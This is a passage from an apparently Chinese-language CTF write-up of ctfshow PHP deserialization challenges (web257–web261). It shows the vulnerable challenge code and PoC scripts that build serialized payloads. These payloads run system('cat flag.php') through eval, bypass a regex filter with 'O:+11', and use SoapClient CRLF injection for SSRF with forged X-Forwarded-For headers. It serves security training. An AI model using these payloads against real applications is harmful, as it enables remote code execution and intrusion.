class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>è§¦å‘ backDoor å³å¯</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat ./flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616256960065-2a3679a8-6e00-4e5e-8e9e-c0c90093ae8b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616256960065-2a3679a8-6e00-4e5e-8e9e-c0c90093ae8b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web258-æ­£åˆ™"><a href="#web258-æ­£åˆ™" class="headerlink" title="web258 æ­£åˆ™"></a>web258 æ­£åˆ™</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span> <span class='btn'><a class="button"  title='æ­£åˆ™ç»•è¿‡'><i class='fas fa-tag'></i>æ­£åˆ™ç»•è¿‡</a></span> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>ç»•è¿‡æ­£åˆ™ <code>/[oc]:\d+:/i</code> , å…¶å®å°±æ˜¯ <code>C:æ•°å­—</code> æˆ– O<code>:æ•°å­—</code> ä¸è¿ç»­ï¼Œè¿™é‡Œåªéœ€è®© <code>O:11</code> ä¸è¿ç»­å³å¯ï¼Œæ¯”å¦‚ <code>O:+11</code></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user_replace</span> = preg_replace(<span class="string">&#x27;/([oc]\:)(\d+)/i&#x27;</span>, <span class="string">&#x27;$1+$2&#x27;</span>, serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$user_replace</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611153992-4b358d11-62b0-4e5c-a666-eab0b0cc0a3c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611153992-4b358d11-62b0-4e5c-a666-eab0b0cc0a3c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å›¾ä¸­ <code>%2b</code> ä¸º <code>+</code> çš„ urlç¼–ç </p><h2 id="web259-SSRF-CRLF-SoapClient"><a href="#web259-SSRF-CRLF-SoapClient" class="headerlink" title="web259 SSRF + CRLF + SoapClient"></a>web259 SSRF + CRLF + SoapClient</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='SSRF'><i class='fas fa-tag'></i>SSRF</a></span> <span class='btn'><a class="button"  title='CRLF'><i class='fas fa-tag'></i>CRLF</a></span> <span class='btn'><a class="button"  title='SoapClient'><i class='fas fa-tag'></i>SoapClient</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>flag.php (å¤§æ¦‚å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>ä¸å°± XFFä¼ªé€ ï¼Ÿ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616294322022-f90e1c7d-c592-4d3d-82a3-48d22b7b5a56.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616294322022-f90e1c7d-c592-4d3d-82a3-48d22b7b5a56.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¼°è®¡ç»™çš„ä»£ç æ˜¯ä¸å®Œæ•´çš„ï¼Œè¿˜çœŸå® IP åˆ¤æ–­ï¼Œä¼°è®¡å¤§æ¦‚æ˜¯è¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag_tari&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">            file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your ip not 127.0.0.1&quot;</span>;</span><br></pre></td></tr></table></figure><p>æœäº†ä¸€æ³¢ï¼Œå¥‡æ€ªçš„çŸ¥è¯†å¢åŠ äº†ï¼Œé™¤äº†XFFï¼Œæœ¬é¢˜è¿˜ç”¨åˆ° SSRF(SoapClient)+CRLFç»„åˆæ‹³ï¼Œæ¯•ç«Ÿæˆ‘ä»¬çš„ index.php è¿˜æœ‰ç”¨åˆ°å‘¢</p><p>éœ€è¦åˆ©ç”¨ SSRF è®¿é—® flag.php å¹¶æ„é€  XFF å’Œ POST æ•°æ®ï¼ŒSSRFæ¼æ´åœ¨å“ªå‘¢ï¼Ÿ</p><p>SoapClientç±» <code>__call</code> é­”æœ¯æ–¹æ³•</p><blockquote><p>__call() é­”æœ¯æ–¹æ³•ï¼šå½“è°ƒç”¨ä¸€ä¸ªç±»ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•</p><p>å½“è°ƒç”¨ SoapClient ç±»çš„ __call() é­”æœ¯æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå‘é€ä¸€ä¸ª POST è¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°ç”±ç€ SoapClient ç±»çš„ä¸€äº›å‚æ•°å†³å®šã€‚</p></blockquote><p>å› æ­¤ï¼Œå½“æˆ‘ä»¬è¿è¡Œ <code>index.php</code> çš„ <code>$vip-&gt;getFlag();</code> æ–¹æ³•æ—¶ï¼Œä¼šå›  <code>SoapClient</code> ä¸å­˜åœ¨ <code>getFlag</code> æ–¹æ³•è€Œè°ƒç”¨ <code>__call()</code> é­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œå‘é€ä¸€ä¸ª POST è¯·æ±‚</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$soap</span> = <span class="keyword">new</span> SoapClient(</span><br><span class="line">    <span class="literal">null</span>, </span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded&quot;</span>.<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen(<span class="variable">$post_string</span>).<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="comment">// &#x27;user_agent&#x27;=&gt;&quot;edge\x0D\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\x0D\x0AContent-Type: application/x-www-form-urlencoded&quot;.&quot;\x0D\x0AContent-Length: &quot;.(string)strlen($post_string).&quot;\x0D\x0A\x0D\x0A&quot;.$post_string,</span></span><br><span class="line">        )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$soap</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ä¸‹ï¼ŒåŒ…å«ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰çš„ï¼Œæ¯”å¦‚ <code>\r\n</code> è¦ç”¨åŒå¼•å· <code>&quot;</code> å•å¼•å·ä¿æŒåŸæ¥çš„è¯­ä¹‰çš„ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611350560-55adcd6a-fc65-464f-bfb6-bc25637fb7f0.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611350560-55adcd6a-fc65-464f-bfb6-bc25637fb7f0.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>warning æ²¡å…³ç³»</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611367132-719d8d33-5e8f-4769-963c-64c0de6fe2ec.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617611367132-719d8d33-5e8f-4769-963c-64c0de6fe2ec.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web260-ç®€å•æ­£åˆ™"><a href="#web260-ç®€å•æ­£åˆ™" class="headerlink" title="web260 ç®€å•æ­£åˆ™"></a>web260 ç®€å•æ­£åˆ™</h2><span class='btn'><a class="button"  title='PHP/5.6.40'><i class='fas fa-tag'></i>PHP/5.6.40</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow_i_love_36D/&#x27;</span>,serialize(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>])))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tari</span> = <span class="string">&#x27;ctfshow_i_love_36D&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332171270-2a9d87df-21bc-45e8-8197-ec957acb64bd.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616332171270-2a9d87df-21bc-45e8-8197-ec957acb64bd.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="åŸ-web261-SSRF-Redis"><a href="#åŸ-web261-SSRF-Redis" class="headerlink" title="(åŸ) web261 SSRF Redis"></a>(åŸ) web261 SSRF Redis</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span 